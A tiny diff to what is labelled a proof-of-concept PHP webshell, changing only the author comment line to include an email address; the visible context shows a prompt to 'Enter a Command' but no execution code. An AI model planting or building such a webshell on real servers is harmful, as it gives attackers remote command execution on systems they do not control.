@@ -2,7 +2,7 @@
 
 //
 // PoC: a simple webshell 
-// Author: stayp05
+// Author: stayp05@secuacademy.com
 //
 
 echo 'Enter a Command:<br>';
